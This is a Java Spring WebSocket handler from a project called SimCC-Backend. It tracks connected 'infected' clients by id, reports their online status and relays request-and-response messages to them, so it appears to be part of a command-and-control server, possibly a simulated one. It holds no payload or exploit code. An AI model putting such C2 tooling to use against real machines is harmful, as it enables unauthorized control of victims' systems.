package at.simcc.simcc_backend.api.ws;

import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
import at.simcc.simcc_backend.api.sse.InfectedStatusChangeEvent;
import at.simcc.simcc_backend.api.ws.payload.*;
import com.fasterxml.jackson.annotation.JsonInclude;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ResponseStatusException;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.AbstractWebSocketHandler;
import tools.jackson.core.JacksonException;
import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;

import java.io.EOFException;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.*;

/**
 * Project: SimCC-Backend
 * Created by: Georg Kollegger
 * Date: 4/14/26
 */
@Slf4j
@RequiredArgsConstructor
@Component
public class WebsocketHandler extends AbstractWebSocketHandler {

    private final ObjectMapper objectMapper = JsonMapper.builder()
                .changeDefaultPropertyInclusion(incl -> incl.withValueInclusion(JsonInclude.Include.NON_NULL))
                .build();
    private static final Set<WebSocketSession> sessions =
            ConcurrentHashMap.newKeySet();
    private final Map<String, CompletableFuture<WSAwaitable>> pendingRequests = new ConcurrentHashMap<>();

    private final InfectedSSEComponent infectedSSEComponent;

    @Override
    public void handleTextMessage(WebSocketSession session, TextMessage message) throws IOException {
        try {
            SimccMessage msg = objectMapper.readValue(message.getPayload(), SimccMessage.class);

            if (msg.getType() == MessageType.HELLO) {
                StringPayload helloPayload = objectMapper.treeToValue(msg.getPayload(), StringPayload.class);

                sendMessage(session,
                        SimccMessage.builder()
                                .type(MessageType.GOODBYE)
                                .payload(
                                        objectMapper.valueToTree(
                                                StringPayload.builder()
                                                        .content("You said: %s, goodbye!".formatted(helloPayload.getContent()))
                                                        .build()
                                        )
                                )
                                .build()
                );
                return;
            }

            WSAwaitable wsAwaitable = (WSAwaitable) objectMapper.treeToValue(msg.getPayload(), msg.getType().getType());
            pendingRequests.get(wsAwaitable.getId()).complete(wsAwaitable);
        } catch (JacksonException e) {
            sendError(
                    session,
                    ERRPayload.builder()
                            .msg(e.getMessage())
                            .type(ErrType.INV_REQ)
                            .build()
            );
        }
    }

    @Override
    public void afterConnectionEstablished(WebSocketSession session) {
        sessions.add(session);
        infectedSSEComponent.publish(new InfectedStatusChangeEvent(
                (UUID) session.getAttributes().get("iid"),
                true
        ));
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
        sessions.remove(session);
        log.info("Closed!");
        infectedSSEComponent.publish(new InfectedStatusChangeEvent(
                (UUID) session.getAttributes().get("iid"),
                false
        ));
    }

    @Override
    public void handleTransportError(WebSocketSession session, Throwable exception) {
        if (exception instanceof EOFException) {
            log.debug("Client disconnected abruptly (session {})", session.getId());
        } else {
            log.warn("WebSocket transport error on session {}", session.getId(), exception);
        }

        sessions.remove(session);
    }

    private void sendMessage(WebSocketSession session, SimccMessage message) throws IOException {
        session.sendMessage(new TextMessage(objectMapper.writeValueAsString(message)));
    }

    private WSAwaitable sendMessageAndWait(WebSocketSession session, SimccMessage message) throws IOException, ExecutionException, InterruptedException, TimeoutException {
        String id = UUID.randomUUID().toString();
        CompletableFuture<WSAwaitable> future = new CompletableFuture<>();

        pendingRequests.put(id, future);


        // inject id
        WSAwaitable awaitable = (WSAwaitable) objectMapper.treeToValue(message.getPayload(), message.getType().getType());
        awaitable.setId(id);

        message.setPayload(objectMapper.valueToTree(awaitable));

        sendMessage(session, message);

        try {
            return future.get(30, TimeUnit.SECONDS);
        } catch (TimeoutException e) {
            pendingRequests.remove(id);
            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "No response from infected client!");
        }
    }

    public WSAwaitable sendMessageToInfectedAndWait(UUID iid, SimccMessage message) throws IOException, ExecutionException, InterruptedException, TimeoutException {
        WebSocketSession session = sessions.stream()
                .filter(s -> s.getAttributes().get("iid").equals(iid))
                .findFirst()
                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "Infected %s not found!".formatted(iid)));

        return sendMessageAndWait(session, message);
    }

    private void sendError(WebSocketSession session, ERRPayload errPayload) throws IOException {
        session.sendMessage(new TextMessage(
                objectMapper.writeValueAsString(
                        SimccMessage.builder()
                                .type(MessageType.ERR)
                                .payload(
                                        objectMapper.valueToTree(errPayload)
                                )
                                .build()
                )
        ));
    }

    public boolean isConnected(UUID iid) {
        return sessions.stream()
                .anyMatch(s -> s.getAttributes().get("iid").equals(iid));
    }
}
